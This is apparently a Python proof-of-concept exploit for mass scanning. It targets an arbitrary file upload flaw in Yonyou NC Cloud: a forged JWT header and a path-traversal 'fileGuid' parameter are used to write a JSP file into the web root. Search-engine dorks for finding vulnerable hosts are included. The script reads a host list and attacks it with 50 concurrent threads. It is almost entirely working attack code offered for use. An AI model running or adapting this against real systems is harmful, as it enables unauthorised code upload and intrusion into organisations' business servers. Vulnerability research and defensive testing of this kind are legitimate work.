#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa：icon_hash="1596996317" && product="用友-NC-Cloud"
# Zoomeye: app:"Yonyou NC Cloud"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                       +')
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                     +')
    print(
        '+ EXP: python3 Yongyou_NC_Cloud_Uploadchunk_Uploadfile_Poc.py url.txt                                     +')
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "image/avif,image/webp,*/*",
        "Content-Type": "multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9",
        "accessTokenNcc": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ"
        ,"Host":"%s" % host2
    }
    data ='--024ff46f71634a1c9bf8ec5820c26fa9\r\nContent-Disposition: form-data; name="file"; filename="test.jsp"\r\n\r\n<%out.println("test");%>\r\n--024ff46f71634a1c9bf8ec5820c26fa9--'
    vulurl = url + "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1"
    try:
        r = requests.post(vulurl, data=data,headers=headers,proxies=proxysdata)
        if r.status_code==200 and "i18nCode" in r.text :
            response1=requests.get(url+"/nccloud/test.jsp")
            if "test" in response1.text:
                print(url+"true!  "+url+"/nccloud/test.jsp")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])